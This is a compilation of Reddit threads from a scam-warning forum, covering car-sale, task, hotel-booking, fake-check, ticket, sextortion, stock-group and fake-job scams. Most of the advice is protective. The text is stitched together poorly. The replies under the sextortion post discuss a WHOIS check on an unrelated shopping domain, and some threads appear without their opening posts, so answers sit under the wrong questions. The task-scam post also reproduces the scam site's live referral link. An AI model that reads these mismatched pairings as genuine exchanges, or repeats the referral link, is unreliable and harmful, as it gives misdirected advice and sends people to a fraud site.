- I‚Äôm getting the same texts. I thought maybe reverse psychology?
- I've gotten spam email where the sender forgets to use bcc and I usually reply to all with a spoofed address saying "this looks like a scam to me" with a brief explanation why.
- Considering how much time I've spent thinking about this, it may be working lol

- !car
- Yep don't get a vehicle report from a shady website the fake buyer insists on.  Pleasant green has a video on it "Don't Buy Vehicle Reports from Scammers!"

https://www.youtube.com/watch?v=WHLfO\_pu7q4

It's either a bogus site trying to get your sensitive info or they have victims sign up using their unuiqe affiliate link that'll sign you up for monthly credit report sites etc.
- Just tell them no.
- Scammer is going to demand you to get a vehicle report from a specific site.  Tell him from where you are, it's the responsibility of the buyer to get that report Not the seller.
- In the current political environment, just tell them you‚Äôll report them to ICE because why would they have cash only? So they should pay you a premium and your lips are sealed.

Of course it‚Äôs a scam - this is for luls only. They aren‚Äôt subject to deportation, because they are 1000‚Äôs of miles away.

Or tell them you‚Äôll send them a CarFax or CarFox. Not sure if CarFax allows this under TOS. CarFox is free-to owner from the same company.)
- They created a fake VIN site.
- Hi /u/seedless0, AutoModerator has been summoned to explain the Car sales scam.

If you're buying a car, a scammer will list a car on a marketplace site and will ask you to email them. They will tell you that they will ship or otherwise transport the car to you and allow you to inspect it. They may use the name of a company like eBay or Amazon to make the scam sound more legitimate. The scam is that the car does not exist, despite whatever pictures you have received, and you will be asked to pay for the car using gift cards, crypto or irreversible wire transfers..

If the seller is real and wants to actually meet, you may face a different type of scam (which involves a run down, stolen or otherwise bad deal of a car). To prevent this, you need to meet at a mechanic's shop you trust and have a full inspection of the vehicle. Remember all sales are final when dealing with used cars. The seller needs to come to meet you, so as mentioned above, the offer for a courier doesn't help.

If you're selling a car, the scammer will try to have you pay for a verification on a scam website, some VIN check lookup or certificate of records of some sort. Remember you're the seller, you set the terms. If you want to provide some certification, use a website you trust. They can do their own verification if they don't trust yours. And also, they can try to pull a fake check on you. No buyer is sending a courier to pick up a car they haven't seen.

And again, if the buyer is real and you actually sold the car, the same rule applies: all sales are final, so do the proper paperwork, consult a subreddit dedicated to car sales and make sure the transfer is completed.

Title: Task scam, Beware And Do Not Fall For It.
Body: Task scam, Beware And Do Not Fall For It.

More and more of these have been popping up lately and people seem to be falling for it, so here to report it.

https: //tyt-trx.com/#/register?ic=500141

The fact that they don't even bother to change the company is funny to me lol, Toyota would not engage nor create such a wackass job online and please do not fall for such scams, I am here to report them and make people aware of it.

So basically they tell you to deposit money usually crypto into the site and they give you earnings based on the orders you fulfill but these orders keep on increasing in price and they ask you to deposit more and more and it's a whole cycle basically.

Keep safe, y'all.

- Don't send money to people to work for them online, gotcha
- Thank you. Unfortunately these are posted 100x a week here. There‚Äôs even an automod for it !task
- thanks for sharing. of course dont send them anything it's an obvious scam. stay safe!
- Hi /u/dpaanlka, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: Expedia refusing to refund a scam hotel, help?
Body: RESOLVED

I‚Äôm travelling in Kenya and planned to stay at a hotel for one night before a safari. I found a hotel that had good reviews on Google and Expedia were advertising it so I clicked on the Expedia link to book it. The name of the hotel on Google was Buraha Zenoni Hotel and Resort. However when I clicked on the Expedia link, on the Expedia website it was called Buraha Hotel and Resort (without the Zenoni) but had all the same pictures as the actual hotel. I didn‚Äôt notice the change in name upon booking but only afterwards. 
I booked a reservation however upon turning up at the hotel they said that they didn‚Äôt receive the booking and looked at my booking reservation on my phone and said that they had issues before with this hotel and it was a scam that was pretending to be the actual hotel.
I contacted Expedia on this however they are refusing to refund my booking as I didn‚Äôt purchase insurance on my booking however I didn‚Äôt attempt to ‚Äúcancel‚Äù my booking because I couldn‚Äôt go but because the hotel didn‚Äôt exist! Expedia are advertising a scam hotel but refusing to refund. What further action can I take from here?
I did make the booking on an AMEX credit card so I am going to try to dispute it with them once it goes through however wanted to know if there is any other action I can take against Expedia?
Thanks

- Your best recourse is through AMEX they have pretty good protections against this.
- Just contact AMEX. Highly likely they'll charge you back the money.

For Expedia, make a complaint to your country's consumer protection organization.
- I'm glad Amex took care of this, but Expedia should be ashamed. You should not need to buy insurance for fraud protection. If that were necessary, then every business that sells services would be riddled with frauds on the daily and the business would not have any responsibility at all. 

In future perhaps try Travelocity, Expedia's rival. Maybe they're better at this.
- File a chargeback. I had this issue in Japan.

We booked a place via Priceline, but when we got to it, it was some Airbnb, not a hotel as advertised. This place required a code to get in and I wasn't sent the code. We were there for 30 min. trying to get in, before we had to give up and catch the last trains back to the airport.

When I got back to the States, I tried contacting Priceline, which kept sending me to Booking.com. They continued to give me the runaround. After an associate hung up on me, I gave up and went through Chase. Priceline/Booking tried to get me to drop the dispute and the owner of the property tried  telling Chase that I had actually booked the day before. I sent a copy of my confirmation email and Chase refunded me. It took several month, but I did get my money back. :-/
- That‚Äôs such BS!  I had a similar experience with Expedia and ended up having to move rooms every night of our stay. I will never use Expedia, Travelocity, etc. Their only business model is to make more money at the customer‚Äôs expense. Good for you AMEX handled it!
- Where did you end up staying?  Can you update
- did you click an advertisement that was separate from the listings on the actual expedia site? 

did it take you to an external site that no longer belonged to expedia?

(trying to make sure i understood this part of the post)-

if so, it isnt expedia‚Äôs fault that you booked with an external website that is not affiliated with their company. 

clicking an ad isnt the same as clicking a link within the expedia website.

you could report this to FTC perhaps, & state that it was misleading and too close to appearing like it WAS part of their site still.

but you say here you recognized it for what it was, an ad, and not a listed property within their own site.

there isnt much you can do about it except take it as a lesson learned. 

sorry.
- Yep I just contacted AMEX and they have already resolved the dispute within minutes!! Very lucky
- I love Amex for that‚Ä¶they‚Äôve come through for me in the past.
- I live in Scotland but Expedia is based in USA. Assume to still report to my own country‚Äôs organisation? I do want to report them as they have even removed my review as I said it was a scam
- Yep, going to leave a review and also report them because it‚Äôs really slimy behaviour from them. Thankfully I used credit card!
- Lots of big platforms think they are not responsible for the ads run on their platforms being scams. They just take the revenue and say ‚Äútoo bad‚Äù.

Platforms need to be held accountable for the ads they run.
- they absolutely do.  agree 100%.

ive also read that sites can choose which theme of ads get pushed to their users.  if expedia pushes ads for non-affiliated sites that have similar images as their own, that is also pretty crappy.

Title: Weird deposits into my bank account
Body: For the last month I‚Äôve been getting a large sum deposited into my bank account from a company I‚Äôve never worked for nor any of my employers partner with. I researched this sub and found this company was used to send a fake check to someone about 10 years ago. Seems like the same thing is happening here but they actually have my bank information? I haven‚Äôt contacted the company yet, but I did tell my bank that I‚Äôm not sure why I keep getting these. Is my bank account going to get drained soon - like is this one of those ‚Äúin and out‚Äù schemes?

- 1 do not touch the money

2 ignore ANYONE asking for it back

3 alert your bank for potentially fraudulent payments

4 let the bank resolve it
- It's possible they are depositing fraudulent checks or money from stolen credit cards on their own account, sending you the money and they will then ask you for the money to be returned (through cashapp, crypto or an account with a different bank). That would allow them to clean stolen funds or turn fake checks into real money, while you hold the negative balance. 

You contact your bank's fraud department and leave the money alone. Assume it's going to get clawed back at some point (though it may be weeks or months). Ignore any pleas for return of the funds and tell them to sort it with their banks. Make sure your bank accounts are secure (no unauthorized logins, easy passwords 5 years old, etc). Enable 2FA if you haven't already.
- >Is my bank account going to get drained soon - like is this one of those ‚Äúin and out‚Äù schemes?

The issue of direct deposits followed by ACH withdrawals has been reported a number of times.  I would specifically address that concern with the bank.

Since you implied a check, be alert to some effort to get you to return the money.  Let the bank handle that.  Has that other money deposited actually cleared?
- OK, I just checked with my wife, who is a ~~ferensic~~ forensic accountant working for a CPA firm. If these deposits are, in fact, the result of a routing error and the money was supposed to go to someone else, the company is likely to want to reverse these transactions and does not need your authorization to do so.

You NEED to leave the money in the account to which it was deposited, so they can get it back. If the money is not there, you may be subject to overdraft considerations, and, they might be able to sue you if the money is not available to be returned.

I will reiterate my advice to contact the company to inform them of the mistake, and add to it that you make sure that ALL of the funds are available in the account to be clawed back when the error is corrected.

Yes, your account is likely to have these mistaken payments drained from it, but it's not a 'scheme', more likely just a simple error.
- Have you talked to your bank?
- The SEC:PPD part of this indicates the Standard Entry Code of PPD, which means 'Pre-arranged Payment and Deposit'. This can be either a credit or a debit.

If this is being credited to your account (as a deposit), it seems likely that someone at QuinStreet messed up and typo'd a routing number. You might very well be getting someone's paycheck.

I would suggest that you contact the company (preferably an accounting manager) and let them know what's going on.

I don't know how easy it would be for them to reverse the transactions as they require authorizations. While the person who was -supposed- to have received the money authorized -that- transaction, I -think- that they would need -your- authorization to take that money back out of -your- account.
- My thoughts exactly - thank you!
- Yes, in fear of my account being drained I transferred all my funds out and have the 3k that was deposited the first time in a separate acct from my own funds. The first one happened around 1/08
- I went in and talked to someone about it when it first happened - they said it was most likely a mistake and the company would most likely try to recollect the funds, but they haven‚Äôt and have since deposited more money lol
- Please no don't give them any sort of¬† authorization, the bank is capable of doing it themselves if they really want to. There was a post here where the manager of the bank themselves was encouraging the person to "just return back the etransfer" o.o not everyone who works in the bank is smart lol just let them resolve it themselves
- >3k that was deposited the first time in a separate acct from my own funds

Put that money back in the account to which it was deposited, and leave all of the subsequent deposits there. Sooner or later they will discover the error and are going to want that money back.
- What I would have done too.
- >Please no don't give them any sort of  authorization, the bank is capable of doing it themselves if they really want to

I already covered this in another response where I advised to keep the funds in the account to which they were deposited, as they were likely to be clawed back with no authorization needed.

Do try to keep up, eh, instead of going off half-cocked?
- You did say that in another response and I actually upvoted it because I agreed with it but then you post this different response telling them to authorize someone else to take money from their account which is a bad advice. Resorting to name calling just to live up to your username is pathetic
- First off, as everyone can clearly see, there's no 'name-calling' here (especially since the mods like to slap me for the slightest things), and for you to say there is is wild.

Second, I didn't tell the guy to authorize jack shit, I was speculating on whether authorization was required, which, when I checked with an expert (my wife) I was informed that it was not, which I covered in a different response. I merely said that he should call the company and inform them of the error, which would be the best thing for all concerned...especially for the guy who isn't getting his pay because it's going to the wrong account.

Not only are you going off half-cocked, you're shooting yourself in the feet.

Title: Scammed Out of $750 for Tickets I Never Got- And was asked for a 1000 transfer fee
Body: So, I attempted to buy AESPA LA tickets off this person on twitter. Resale tickets for nosebleed seats are pushing 300+ dollars and I noticed other twitter sellers were selling their VIP tickets for around 300! So i thought wow what a steal! So I hit up this guy u/soma_1956 ( u/briearra on venmo)  since he was selling three tickets, and he said he was selling them for 250 each. I noticed he wasnt following aespa on twitter (but he was following another korean group), this guy was following random accounts from India and I didnt want to stereotype so I went with it anyway. I wasnt entirely sure, so I asked if i could pay for one ticket at a time, and they replied ‚Äúdo you have trust issues with me‚Äù and ‚Äúbe rest assured bestie youre getting your tickets immediately after the payment‚Äù. I sent the first payment, and bro claims that he cannot send one ticket at a time (he sent a fake screenshot of a chat with help.ticketmaster.com) . I ask if he could just send them all and I send the money after, even offering him a little extra to send them first, but he replies that ‚Äúyou dont have to worry youre safe with me i know how hard it is to make money i will never hurt u‚Äù I know this is so silly of me but i still had hope, i sent the remaining 500 dollars and he said that ticketmaster is asking for a TRANSFER FEE of 1000 dollars! And that the 1000 dollars is refundable once the ticket transfer is completed?? I explained how i dont have the money to do that, and since its refunded, why doesnt he just pay? He claims to not have the money either. I asked to be refunded but he claimed thatl7 since the tickets are transferring, they cannot be cancelled before the fee is paid. ‚ÄúU dont have to worry its refundebale lets just get this done asap so u can get the tickets‚Äù ‚Äúyoure not getting scammed trust me please i pinky promise‚Äù Whatever, i carry on with my day and around 2 hours later he texts me again, and i respond 3 hours after that. He asks me to send transaction proof again so i do of course cause i still had hope that they figured it out on their own! But I check their account again, and the SAME ADVERTISEMENT that i replied to was reposted again. After that i instantly knew bro was lying. Soo now im 750 down the drain lol I DONT EVEN KNOW WHAT TO DO ANYMORE

- 1) Don't trust sellers on social media

2)This:

> they replied ‚Äúdo you have trust issues with me‚Äù and ‚Äúbe rest assured bestie youre getting your tickets immediately after the payment‚Äù

is a giant red flag. When doing a legitimate exchange of goods and services, only scammers have to reassure you that the sketchy ass methods they are using are legit and "totally not a scam bro". 

3) Never trust screenshots. They are not "proof" of anything

Always use actual resale market sites. If the tickets are too expensive there's a reason for that and no one's offering less than the going rate other than to scam you. If that means you don'tg et to go, well then you don't get to go
- Your money is gone.

Please try to improve your critical thinking...
- You can't buy tickets on social media. That's it. You can't even really buy from people you know on social media as their account may have been hacked. First party sellers like Ticketmaster, only and if you MUST buy third party, it's Paypal Goods & Services ONLY, or reputable sites like Stubhub where you pay by credit card and have that protection.

Your money is gone. There are no tickets. There never were any tickets. You just gave your money to a stranger, that's the beginning and the end of it. You gave the stranger money, they asked for more money. No tickets, no fees, no nothing. That's all there is and all there ever was.
- To be totally honest most people are not going to read your post. The punctuation, lack of paragraph breaks and overall bad grammar makes it difficult to read at best. I'm not trying to be hyper critical (Heaven knows in terms of grammar I can live in a glass house) but if you want help from folks you need to present your post in a form that people can easily read and understand your issue.

Watch out for any !recovery scams who says that they will be able to help you for a small amount. No one can help you but you can definitely reach out to your bank and see if they might be able to help (don‚Äôt count on it though as you sent it willingly).
- So sorry , this sucks! People have no heart!
- They suck, but it‚Äôs better than losing your money to a scammer.
- Have some empathy, babe.
- I read it fine. The world kept spinning.
- Hi /u/Hear-that-sound, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: A scammer got my spicy pictures
Body: A scammer got my pictures, but in one of them I had underwear on and my face was in it, but for my lower area it didn't show any of my face.  For background, they added me on snap and asked to trade certain pictures, and me being the dumbass that I am, I said yes. At the time, I did not realize that she would leak them obviously. I am going to try and deny that the lower area one is me because there is no proof. I blocked the scammer and did not pay them like they wanted, and posted on my story saying they were a scammer and wanted money and all the shit was fake. At first, they wanted me to pay them $800, but obviously I was not gonna do that. They then asked for $150, and I lied and said I would pay them. I then screenshotted the account and posted it on both my Snapchat and Instagram story saying how it was a scam and the pictures were fake, and then I blocked them and make my Instagram account private. They threatened to send the pictures to all of my followers, and I am still scared that they will because I did not send them the money. Plus, they screenshotted my followers so they probably still know the usernames. What might happen? Did I handle this well?

- You won't find anything because they're probably dropshippers fresh out of the oven !whois homebaa.com
- ` WHOIS REPORT FOR HOMEBAA.COM `

This domain name was first registered only 5 months ago (Jul 2024) and it was only registered for a single year (Expires: Jul 2025). 

It is also concerning that they are hiding their contact info on Whois. This website is hosted on a server located in Canada (*Cloudflare, Inc.*), but this is probably a "proxy" which is masking where the website's server actually is.

I'm curious, what did you do? Asking a search engine "who owns a website" takes seconds. (I picked a query that does not in any way contain "who is").
- You can use the whois command on Reddit here just like the other commenter did, or you can use the whois command if you have access to a Linux/UNIX/AIX command line or with a DOS command line (Windows CMD window) IF whois has been installed in DOS (optional in DOS).

Or, you can also go to:

And do a whois there. (This is what the Reddit bot uses).

Title: US Stock Steering Group on What's app. Is it genuine?.
Body: I joined this group recently via facebook. They are saying 90 days free advice and then need to sign a contract which could take a cut of 2 - 5% of the profits i make based on their advice. They will ask us to invest on some stocks at a limit price and will also tell us to sell at a particular price.  
We are free to use any trading account of ours, but they are asking to use only cash account not margin accounts. They suggested few short term stocks so far, i gained 5-10% and 1-2 stocks i lost 5-10% as well. They say they cover the losses on the medium-long term plan, which they are saying could give profits 160% - 300%, but they asking to invest some where around 200k

- Replace facebook and WhatsApp with random strangers on the street and ask yourself if you would give them $200k.
- Facebook. WhatsApp. guarantee no losses. insane returns

yes it can't possibly NOT be a scam
- How does any of that sound legit? Of course it's a scam.
- Come on. Just use common sense and educate yourself on what realistic investment returns are. If you don't know that every investment group on TG wa, or any other social media is a scam, just max out your 401k and buy index funds with whatever is left.
- No. It's a scam.  

Think about it for a second: what if I offered you advice on which stock to buy, and then came to collect from you if it went up, and ghost you if it went down
- It's a scam, 100%. What they'll do is feed you a couple of easy and obvious risers that make you a few bucks, then they promise you a big one that'll double your money. They'll give you a buy in price and tell you to go all in for the maximum. You'll do that, it'll rise for a couple of days, and then WHAM, they'll short the fuck out of it and you'll lose 90% in a matter of hours, if not sooner, as they sell for high prices and the stock tanks.¬†


I learned the hard way.
- There is no such thing as an investment group on Whatsapp. Every single one of them are scam groups.
- 100% scam. All the people in the group are part of the scam.
- There is no such thing as free money or risk-free investment with high percentage earning guarantees. Your pursuit of free money will only end in you getting scammed.
- >US Stock Steering Group on What's app. Is it genuine?.

You should not be investing if you‚Äôre falling for ‚Äútrading signals‚Äù from anonymous scammers on WhatsApp.

It seems that instead of trying to learn how to invest, you‚Äôre just searching for anybody that tells you they‚Äôll make you rich. ü§∑‚Äç‚ôÇÔ∏è
- And you have to give them your password?

How do they enforce you sending them their share of the profits?
- Gosh op it‚Äôs as clear as day
- If it‚Äôs too good to be true‚Ä¶
- Put money in a Vanguard ETF. Forget about it.
- bro
- No strangers online are trying to make you rich, especially hot women.
- "Steering group" means it's a scam. There is no such thing as stock advice through whatsapp. Get advice from a genuine broker or none at all. Anyone sharing advice through whatsapp is trying to scam you.

My gut tells me the 2-5% profit sharing is a fakeout to make this look legitimate. More likely, this is a pump and dump and their 'signals' are going to make you buy something they've pumped up and are either looking to dump or have previously shorted it.

Them asking you to invest 200k cash is a serious red flag here. Think about what 200k a person would do for a scammer setting up a pump and dump. All victims will be out their life savings, and the scammer gains millions as they cut and run... and the only thing you have to identify them is a facebook handle.
- You don't have to.
- They are saying they are from "MPC Capital Advisors, LLC". When i ask them share the official email address, they are not sharing it..
- üòê, thanks for sharing here with me, thank you so much
- It‚Äôs a common stock investment scam. The scammers start by gaining the trust of their victims, letting them use legitimate trading platforms, and making a few semi-decent predictions. Then comes the rug pull, when the victims are invited to ‚Äòinvest‚Äô through the scammers, or into a pump-and-dump scam.
- After 90 days, they will send a contract, I asked them to share now, but they haven't shared one
- dude, no professional management firm says stuff like "profits 160% - 300%". They are lying.
- What is an ‚Äúofficial email address‚Äù lol?
- Company email address I meant
- So anyone who's got 5 minutes and $5 to register mpcca dot com and send you an email is trustworthy enough for you to give them $200k?

Come on now. Of course this is a scam.

If they don't try to get you into "their platform" to steal your money outright, they're likely recruiting you for a pump-and-dump.

- It's probably a scam. Even if it's not, never talk to a cop willingly and never without your lawyer present. Ignore and block.

In the remote possibility it's real:

"Don't talk to the police:" https://m.youtube.com/watch?v=d-7o9xYp7eE

Short version: https://m.youtube.com/watch?v=uqo5RYOp4nQ
- Highly likely a scam.  Real detectives are professional enough to leave you a voice mail, they're not going to send you a text in my opinion.
- "never talk to a cop willingly"

What do you do when you're a victim of crime?
- Unless it's an emergency, you still contact your lawyer first. At minimum, they will help you with figuring out which law enforcement agency to report to, and what to include or leave out in your report.
- Seriously? Your car is stolen or your house is burglarized and you go talk to a lawyer before calling the cops? 

And what if it is an emergency? Who do you call then?
- Yes.

911
- 911: cops?
- Yes

Title: Wanted to see if anyone else has dealt with this phone scam. Called my parents as well.
Body: Hello!


Wanted to see if anyone else dealt with these scammers. They‚Äôre pretty good- the part that almost got me is everyone that you speak to is an American. 

A few weeks ago, I received the following voice mail. (Edited to remove identifying details about myself and phone numbers) 

‚Äú*** this is Anita Caldwell contacting you today in regards to a claim that is now ready to be filed to the county I have tried reaching out several times over the last few days and all correspondence has been ignored now we are intend on proceeding with the order of location and we have verified your commercial as well as several residential locations understand that you do still have the right to contact the office filing your claim to update your information and I'll provide the information to that office once again just so there is no way for you to state you have no prior knowledge of this matter the phone number to that office is once again 855******* and when you call you'll need your claim number E955284 now this is considered your final notification by telephone and **** if you will be located unless I'm instructed otherwise‚Ä¶‚Äù

They left my mom a very similar voicemail as well. They call from a spoofed number, and tell you to call that 855 number back to get more information. When you call back, they will NOT tell you what your case is, what info they have, or even who they are until you give them the claim number that‚Äôs provided. 

They continued to call me every week after this. Finally, I got frustrated and asked for the name and address of their business so I could report them to the FTC. They again told me they can‚Äôt reveal any company info, but they could give that info to my lawyer. I was able to squeeze out that there are 2 separate ‚Äúcompanies‚Äù these scammers work for called Mutual and Enterprise located in Atlanta, GA. 

Has anyone else dealt with these guys? 

I know I don‚Äôt have any open court cases against me, which is the only reason why these scammers did not get me.

- !debt
- Process server scam: https://www.reddit.com/r/Scams/s/btbHq2YZNT

Use your middle finger to block their number, and just keep doing that.
- Hi /u/Flaky_Law2653, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Report correctly referenced documents (SSN, drivers license, credit card) as stolen to the respective agencies. If you are unsure of how to move forward, request guidance from local law enforcement. Credit to user l0john51 for this script.

Title: Could this be a scam? Can I prevent it?
Body: Hello! I recently created a website by buying the domain on namecheap and hosting it on cloudflare. Now, a couple of days later, I keep getting multiple emails in different languages from different people, with the same person in the ‚Äùto-field‚Äù and my email address in the ‚Äùcc-field‚Äù. They all have the subject ‚ÄùYour website ranked at the top of Google search results‚Äù but the content is in various languages. It seems to be a thread of emails, containing suspicious loan requests and support matters, and in multiple places I can see the ‚Äùto-person‚Äù suggesting to get in touch with him to increase SEO. 

In my eyes this is seems to be some type of scam. However, it is not as if there are any links they wish for me to click on. Could it be something else that I should worry about? Also, how should I proceed? I do not want to keep receiving these emails, and my guess is that the scammer got a hold of my email address either through my website where it is linked, or through namecheap or cloudlflare. Anyhow, I would like to protect my address in case other scammers would get a hold of it and start flooding my inbox as this one has. Any tips are appreciated.

Thanks in advance!

- Just keep marking it as spam, delete, and move on with your day. Spammers gonna spam
- The email address these are going to, is it a business email address connected to your website?

Typically email addresses that were used to register a domain become public info, which means it's best to have an email address only for that purpose and not used for anything else.

Whatever email addresses that are listed on your website will get spams and scams, which means that you should have different aliases for different purposes such as info@yourdomain listed, but sales, vendors, website, marketing at your domain are not public.
- It's spam coming from a company offering SEO services. Just keep on marking it as spam or ad it to block list.
- Many folks, some legit, some scammers stay on top of domain registrations - and then send emails offering services to the email address of record (if there is one that is public).

Kinda like how when you buy a car, you suddenly get those letters in the mail offering warranty services.

Title: Anything on Advanced Tower Structural Solutions?
Body: Applied for the remote data entry job on Linkedin and got an email requesting a job interview on Skype which I didn't question at first because while it's out dated I expected a video call. It's been all text which was a red flag but I'm new to remote positions and don't know if this is a regular thing or not, I'm coming off my first job that was hybird as a Tech Writer and since my contract was up was looking for a fully remote job. He gave me a rundown then sent me 15 job related questions to answer. After that is when i got more weird or maybe I was overthinking it like I said I've never did fully remote and haven't experienced that interview process he asked what bank I used to make sure they were in line. That's a scam right? I told him but didn't give any info on the account I'm not stupid haha and then he said it would be 20-25 minutes while he forwards the conversation to his HR manager to review. I'm still on this interview and just wanted to confirm before I exit out on this

- Yes, it's a scam. Real companies with real jobs don't interview by text.

Most job offers for remote or work from home jobs are scams. If you're currently looking for a job, spend a little time here to get familiar with job scams so you recognize the signs.

Some red flags:

- contacted  on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)
- Agreed, text only interviews are not a regular thing for any type of positions (remote, hybrid, or in person). People hiring remote workers should be upfront and open to talking face to face with the employees they‚Äôre hiring. And as a person applying to the job you should want to see who you‚Äôre actually working for too.
- OP this is 100% scam. There are no legit remote data entry jobs.

The reason they want to know the name of your bank is for the !fakecheck scam. See below.
- He did not say text, he said Skype. Some business do use Skype. Look up the company, official website, official HR to confirm they are who they say they are.
Do not give out any more personal information until you know it is legitimate.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- I mistook it was listed as Data Analyst because that‚Äôs what I was looking at but yeah makes sense. My gut was telling me that because I‚Äôm not really a person that‚Äôll get scammed I‚Äôm pretty street smart but also didn‚Äôt want to throw away a job since I‚Äôm not used to the remote thing.
- Yes, video call interview is common. But in this case, it was a Skype text only interview.
- It is unclear from the post whether they texted the questions or the interviewer verbally asked the questions.
- From the post:

>It's been all text which was a red flag but I'm new to remote positions and don't know if this is a regular thing or not
- Naw...a company would want to see you are a real person, are who you say you are, how you respond to questions in real time & stuff. Maybe go through a couple of video interviews with different people for screening.


Remember in an interview, YOU are also interviewing the company and the job offer.


Does it fit with your abilities, skills, able to do it, have the right equipment for it, are able to do the training, your schedule, expectations.


There is some back and forth and questions on your part that is normal and expected.


If it is way too overly vague that you are not able to ask those questions, how can you assess whether you are confidently able to do the job?


They should have some real address somewhere, job title & description you can look up that other previous employees have done etc.


I personally have never been asked what bank I use for any job interview I have been on.

Title: Distressed young woman knocks on the door at night
Body: 10pm on Saturday 1/19/25. The house is lit automatically by timer. Both cars are in the driveway. Knocking at the door. A woman, shaking, tearing, asks if she can use our phone? She's in a robe, hair towel, and slides. She does not smell like soap. She talks about how she's 20, her parents turned off the wifi so she can't use her phone. (What?) She's carrying a small duffel and a designer purse. (Had time to pack a bag but not to tie her hair back?) Her acrylic fingernails and toes are done. She says she has anxiety and even though she pays rent, they keep putting her out. 

We have her sit in the entryway and bring her a bottle of water. We exchange a "BS" look. She pulls up the number and husband calls it, puts it on speaker. She says she's calling her cousin. 

You can hear the dad in the background asking who it is and she says "Michael's sister" (pretty weird way to talk about your cousin). Cousin takes the address and is 2 minutes away. A car pulls up and she leaves. 

Best guess, they were casing the house for valuables, but she saw nothing from the hallway. What else might this be?

- One of these scams is to get you to hand over a cell phone, then while distracting your attention, either load spyware or access your banking apps directly to steal money. If you refused to let her touch the phone you defeated the con and forced her hand to the Plan B getaway.

Good on you for not playing their game, but the best move was to call 911.
- THIS HAPPEND TO ME ONCE. Offered to call their ‚Äúfriend‚Äù through the screen for them and they refused they just wanted the phone and I offered to call the police and they refused and begged me to hand over my phone. It was a young lady. Strange situation, she was seriously wanting to negotiate me opening the screen door to hand over my phone‚Ä¶. Never seen her in my neighborhood again
- I woke up to an old lady tapping on my windows and saying "let me in" at 5 am, and then she moved to tapping on my door. The thing was she was talking to somebody else (or herself) in a low voice. This kept up for a couple minutes, and then she left. I didn't answer or look out but I could kind of see her through the blinds the first time. This was a terrible neighborhood and I'm pretty sure she was having a mental health episode or this was some symptom of dementia but if not, yikes.
